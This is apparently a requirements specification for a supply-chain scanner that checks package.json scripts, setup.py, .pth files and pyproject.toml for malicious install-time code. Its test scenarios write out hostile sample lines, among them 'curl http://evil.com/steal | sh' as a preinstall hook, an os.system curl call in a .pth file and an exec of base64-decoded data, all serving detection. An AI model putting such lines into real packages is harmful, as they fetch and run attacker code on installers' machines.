## MODIFIED Requirements

### Requirement: package.json scripts fields analyzed
The system SHALL parse `package.json` as JSON and extract all key-value pairs under the `scripts` object. Each value SHALL be analyzed with the three detectors (entropy, obfuscation, network).

#### Scenario: Malicious preinstall script detected
- **WHEN** a tar contains `package.json` with `"scripts": {"preinstall": "curl http://evil.com/steal | sh"}`
- **THEN** the scanner extracts `"curl http://evil.com/steal | sh"`
- **AND** the network detector returns BLOCK with reason "network"

#### Scenario: Clean scripts pass
- **WHEN** a tar contains `package.json` with `"scripts": {"test": "jest", "build": "webpack"}`
- **THEN** the scanner returns PASS

### Requirement: Script-referenced JS files scanned
The system SHALL detect when a scripts value references a `.js` file (via `node`, `--require`, or direct path) and SHALL extract and scan that file from the archive.

#### Scenario: Referenced malicious JS file detected
- **WHEN** `package.json` has `"postinstall": "node ./evil.js"`
- **AND** the archive contains `./evil.js` with malicious base64 content
- **THEN** the scanner extracts `evil.js` and the obfuscation detector returns BLOCK

### Requirement: setup.py and __init__.py full-text scan
The system SHALL scan the entire content of `setup.py` and `__init__.py` files with all three detectors.

#### Scenario: setup.py with encoded payload
- **WHEN** a tar contains `setup.py` with `exec(base64.b64decode("..."))`
- **THEN** the obfuscation detector returns BLOCK

### Requirement: .pth file import detection
The system SHALL scan `.pth` files line-by-line. Lines starting with `import` or containing `exec(`/`eval(` SHALL be analyzed with the three detectors.

#### Scenario: .pth with malicious import
- **WHEN** a tar contains `malicious.pth` with line `import os; os.system("curl evil.com")`
- **THEN** the network detector returns BLOCK

### Requirement: pyproject.toml build-backend check
The system SHALL parse `pyproject.toml` and extract the `build-system.build-backend` value. The value SHALL be analyzed with the three detectors.

#### Scenario: Suspicious build-backend
- **WHEN** `pyproject.toml` has `build-system.backend = "malicious-backend"`
- **THEN** the scanner analyzes the value and returns PASS if no suspicious patterns found

## REMOVED Requirements

### Requirement: Filename-based install script matching
**Reason**: Replaced by structured content analysis that covers the full attack surface.
**Migration**: No action needed. The new analyzers automatically cover all previous target file types.

### Requirement: isInstallScript function
**Reason**: Replaced by type-based dispatch to js_analyzer and python_analyzer.
**Migration**: N/A — the function is removed.
